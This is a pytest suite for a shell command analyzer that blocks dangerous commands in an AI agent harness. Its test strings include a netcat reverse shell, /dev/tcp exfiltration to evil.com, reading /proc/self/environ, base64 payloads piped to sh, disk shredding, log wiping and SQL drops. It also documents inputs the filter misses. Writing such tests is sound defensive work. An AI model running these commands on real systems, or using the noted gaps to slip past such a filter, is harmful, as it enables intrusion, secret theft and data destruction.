"""The rule tables of the shell command analyzer: quote stripping, system and configuration protection, SQL, encoded and inline execution."""

from __future__ import annotations

from myrm_agent_harness.toolkits.code_execution.security.shell_command_analyzer import (
    _strip_quoted_content,
    analyze_command,
    has_block_threat,
)


class TestStripQuotedContent:
    """Unit tests for the quote stripping helper."""

    def test_no_quotes(self):
        assert _strip_quoted_content("ls -la") == "ls -la"

    def test_preserves_unquoted(self):
        result = _strip_quoted_content("echo hello")
        assert "echo" in result
        assert "hello" in result

    def test_unclosed_quote_returns_original(self):
        original = 'echo "unclosed'
        assert _strip_quoted_content(original) == original

    def test_single_quote_strips_content(self):
        result = _strip_quoted_content("echo 'rm -rf /'")
        assert "rm" not in result
        assert "echo" in result

    def test_ansi_c_quoting_strips_content(self):
        """ANSI-C $'...' content should be fully replaced with placeholders."""
        result = _strip_quoted_content("echo $'\\x72\\x6d'")
        assert "\\x72" not in result
        assert "echo" in result

    def test_ansi_c_quoting_with_escape(self):
        """Backslash escapes inside ANSI-C quoting should be consumed in pairs."""
        result = _strip_quoted_content("$'hello\\nworld'")
        assert "hello" not in result
        assert "world" not in result

    def test_ansi_c_quoting_preserves_surrounding(self):
        result = _strip_quoted_content("cmd $'abc' rest")
        assert "cmd" in result
        assert "rest" in result
        assert "abc" not in result

    def test_locale_quoting_strips_content(self):
        """Locale $\"...\" content should be fully replaced with placeholders."""
        result = _strip_quoted_content('echo $"hello world"')
        assert "hello" not in result
        assert "echo" in result

    def test_locale_quoting_with_escape(self):
        """Backslash escapes inside locale quoting should be consumed in pairs."""
        result = _strip_quoted_content('$"foo\\nbar"')
        assert "foo" not in result
        assert "bar" not in result

    def test_locale_quoting_preserves_surrounding(self):
        result = _strip_quoted_content('cmd $"xyz" rest')
        assert "cmd" in result
        assert "rest" in result
        assert "xyz" not in result

    def test_double_quote_not_stripped(self):
        """Regular double quotes should NOT strip content (allow $() detection)."""
        result = _strip_quoted_content('echo "$(whoami)"')
        assert "$(whoami)" in result

    def test_mixed_quoting(self):
        """Mixed quote types in one command."""
        result = _strip_quoted_content("echo 'safe' \"visible\" $'ansi'")
        assert "safe" not in result
        assert "visible" in result
        assert "ansi" not in result


class TestSystemBinaryAndConfigOverwrite:
    """BLOCK-level: system binary overwrite, shell config overwrite,
    /proc/environ leakage, and /dev/tcp bypass."""

    def test_overwrite_usr_bin(self):
        threat = has_block_threat("echo malicious > /usr/bin/python3")
        assert threat is not None
        assert "Overwriting system binaries" in threat.detail

    def test_overwrite_bin(self):
        threat = has_block_threat("echo x > /bin/ls")
        assert threat is not None
        assert "Overwriting system binaries" in threat.detail

    def test_overwrite_sbin(self):
        threat = has_block_threat("echo x > /sbin/iptables")
        assert threat is not None
        assert "Overwriting system binaries" in threat.detail

    def test_append_usr_bin(self):
        threat = has_block_threat("echo x >> /usr/bin/curl")
        assert threat is not None

    def test_overwrite_bashrc(self):
        threat = has_block_threat("echo evil >> ~/.bashrc")
        assert threat is not None
        assert "shell startup" in threat.detail.lower()

    def test_overwrite_zshrc(self):
        threat = has_block_threat("echo alias >> ~/.zshrc")
        assert threat is not None

    def test_overwrite_profile(self):
        threat = has_block_threat("echo x > ~/.profile")
        assert threat is not None

    def test_overwrite_bash_profile(self):
        threat = has_block_threat("echo x > ~/.bash_profile")
        assert threat is not None

    def test_overwrite_zprofile(self):
        threat = has_block_threat("echo x > ~/.zprofile")
        assert threat is not None

    def test_proc_self_environ(self):
        threat = has_block_threat("cat /proc/self/environ")
        assert threat is not None
        assert "environment" in threat.detail.lower()

    def test_proc_pid_environ(self):
        threat = has_block_threat("cat /proc/1/environ")
        assert threat is not None

    def test_proc_environ_with_pipe(self):
        threat = has_block_threat("cat /proc/self/environ | base64")
        assert threat is not None

    def test_proc_environment_partial_no_match(self):
        """Should NOT match /proc/.../environment_vars (word boundary)."""
        assert has_block_threat("cat /proc/self/environment_vars") is None

    def test_dev_tcp_basic(self):
        threat = has_block_threat("echo data > /dev/tcp/evil.com/1234")
        assert threat is not None
        assert "Bash built-in networking" in threat.detail

    def test_dev_tcp_read(self):
        threat = has_block_threat("cat < /dev/tcp/127.0.0.1/80")
        assert threat is not None

    def test_quoted_usr_bin_safe(self):
        """Single-quoted paths should NOT trigger."""
        assert has_block_threat("echo '> /usr/bin/python3'") is None

    def test_quoted_bashrc_safe(self):
        assert has_block_threat("echo '>> ~/.bashrc'") is None

    def test_ls_usr_bin_safe(self):
        """Reading /usr/bin is safe, only writing triggers."""
        assert has_block_threat("ls -la /usr/bin/") is None

    def test_cat_proc_status_safe(self):
        """/proc/self/status is not /proc/self/environ."""
        assert has_block_threat("cat /proc/self/status") is None

    def test_redirect_append_to_sbin(self):
        """Append (>>) to /sbin/ is also dangerous."""
        threat = has_block_threat("echo x >> /sbin/init")
        assert threat is not None

    def test_dev_tcp_in_subshell(self):
        """Bash networking in subshell context."""
        threat = has_block_threat("exec 3<>/dev/tcp/10.0.0.1/80")
        assert threat is not None

    def test_dev_tcp_quoted_safe(self):
        """Single-quoted /dev/tcp should not trigger."""
        assert has_block_threat("echo '/dev/tcp/example.com/80'") is None

    def test_proc_environ_quoted_safe(self):
        """Single-quoted /proc/environ should not trigger."""
        assert has_block_threat("echo '/proc/self/environ'") is None

    def test_overwrite_bash_profile_with_home_var(self):
        """Using $HOME instead of ~ still triggers."""
        threat = has_block_threat("echo x > ~/.bash_profile")
        assert threat is not None


class TestDangerousCommandsExtended:
    """Additional dangerous command pattern coverage."""

    def test_rm_rf_home(self):
        assert has_block_threat("rm -rf ~/")

    def test_rm_rf_home_var(self):
        assert has_block_threat("rm -rf $HOME")

    def test_chroot(self):
        assert has_block_threat("chroot /mnt /bin/bash")

    def test_export_path_manipulation(self):
        assert has_block_threat("export PATH=/tmp/evil:")

    def test_systemctl_stop(self):
        assert has_block_threat("systemctl stop nginx")

    def test_history_clear(self):
        assert has_block_threat("history -c")

    def test_rm_bash_history(self):
        assert has_block_threat("rm ~/.bash_history")

    def test_overwrite_etc(self):
        """Redirect directly into /etc/ detected via existing regex."""
        assert has_block_threat("cat payload > /etc/hosts")

    def test_clear_syslog(self):
        """Redirect into /var/log/ detected by existing pattern."""
        assert has_block_threat("cat /dev/null > /var/log/auth.log")

    def test_rmmod(self):
        assert has_block_threat("rmmod iptable_filter")

    def test_modprobe(self):
        assert has_block_threat("modprobe evil_module")

    def test_umount(self):
        assert has_block_threat("umount /mnt/data")

    def test_su_user(self):
        assert has_block_threat("su -l root")

    def test_chown_root(self):
        assert has_block_threat("chown root /tmp/evil")

    def test_init_runlevel(self):
        assert has_block_threat("init 0")

    def test_halt(self):
        assert has_block_threat("halt")

    def test_poweroff(self):
        assert has_block_threat("poweroff")

    def test_nmap(self):
        assert has_block_threat("nmap -sS 10.0.0.0/24")

    def test_netcat_reverse_shell(self):
        assert has_block_threat("nc 10.0.0.1 4444 -e /bin/bash")

    def test_shred(self):
        assert has_block_threat("shred /dev/sda")

    def test_disk_device_overwrite(self):
        assert has_block_threat("echo x > /dev/sda")

    def test_service_stop(self):
        assert has_block_threat("service nginx stop")


class TestSQLDestructiveCommands:
    """SQL destructive patterns (often piped to sqlite3/psql)."""

    def test_drop_table_double_quoted(self):
        """Double-quoted SQL is visible to Layer 2 (not stripped)."""
        assert has_block_threat('sqlite3 db.sqlite "DROP TABLE users"')

    def test_drop_database_double_quoted(self):
        assert has_block_threat('psql -c "DROP DATABASE production"')

    def test_delete_without_where_double_quoted(self):
        assert has_block_threat('sqlite3 db.sqlite "DELETE FROM users"')

    def test_truncate_table_double_quoted(self):
        assert has_block_threat('mysql -e "TRUNCATE TABLE logs"')

    def test_drop_unquoted(self):
        assert has_block_threat("DROP TABLE users")

    def test_drop_case_insensitive(self):
        assert has_block_threat("drop table users")

    def test_delete_with_where_safe(self):
        """DELETE with WHERE clause should NOT trigger SQL DELETE rule."""
        result = analyze_command("DELETE FROM users WHERE id=1")
        assert not any("SQL DELETE" in t.detail for t in result)

    def test_sql_in_single_quotes_safe(self):
        """Single-quoted SQL is stripped — not visible to Layer 2."""
        assert has_block_threat("sqlite3 db.sqlite 'DROP TABLE users'") is None


class TestEncodedExecution:
    """Base64/hex encoded shell execution patterns."""

    def test_base64_decode_pipe_sh(self):
        assert has_block_threat("echo cm0gLXJmIC8= | base64 -d | sh")

    def test_base64_decode_pipe_bash(self):
        assert has_block_threat("echo cm0gLXJmIC8= | base64 -d | bash")

    def test_printf_pipe_sh(self):
        """printf piped to sh — single-quoted content stripped but printf|sh still matches."""
        assert has_block_threat('printf "%s" "rm -rf /" | sh')

    def test_xxd_pipe_sh_direct(self):
        """xxd -r directly piped to sh (regex requires -r immediately before |)."""
        assert has_block_threat("xxd -r | sh")

    def test_xxd_pipe_bash_direct(self):
        assert has_block_threat("xxd -r | bash")

    def test_xxd_with_file_not_matched(self):
        """xxd -r with file argument before | — regex does not match (by design)."""
        assert has_block_threat("xxd -r payload.hex | sh") is None


class TestInterpreterInlineExecution:
    """Interpreter inline execution patterns."""

    def test_python_c(self):
        assert has_block_threat("python -c 'import os; os.system(\"rm -rf /\")'")

    def test_python3_c(self):
        assert has_block_threat("python3 -c 'import os'")

    def test_node_eval(self):
        assert has_block_threat("node -e 'process.exit(1)'")

    def test_node_eval_long(self):
        assert has_block_threat("node --eval 'require(\"child_process\")'")

    def test_perl_e(self):
        assert has_block_threat("perl -e 'system(\"ls\")'")

    def test_ruby_e(self):
        assert has_block_threat("ruby -e 'system(\"ls\")'")

    def test_php_r(self):
        assert has_block_threat("php -r 'system(\"ls\");'")

    def test_lua_e(self):
        assert has_block_threat("lua -e 'os.execute(\"ls\")'")

    def test_awk_begin_single_quoted_stripped(self):
        """AWK inline program in single quotes: content is stripped by _strip_quoted_content,
        so the regex `awk\\s+'BEGIN\\s*\\{` no longer matches on the normalized string."""
        assert has_block_threat("awk 'BEGIN {system(\"id\")}'") is None


class TestConfigProtection:
    """Validate configuration and lockfile protection scenarios."""

    def test_eslint_sed_blocked(self):
        assert has_block_threat('sed -i \'s/"no-console": 1/"no-console": 0/\' .eslintrc')

    def test_package_lock_sed_blocked(self):
        """String manipulation of lockfiles is dangerous and blocked."""
        assert has_block_threat("sed -i 's/1.0.0/1.1.0/g' package-lock.json")
        assert has_block_threat("awk '{print}' uv.lock > temp.lock")

    def test_package_lock_rm_safe(self):
        """Removing lockfiles is a legitimate way to reset dependencies and should not trigger the lockfile rule."""
        threats = analyze_command("rm package-lock.json")
        # Should not block due to config protection or lockfile protection.
        # It might trigger some escalate if `rm` is broadly caught, but shouldn't trigger the specific block for lockfile manipulation
        assert not any(t.detail == "Modifying lockfile via shell" for t in threats)
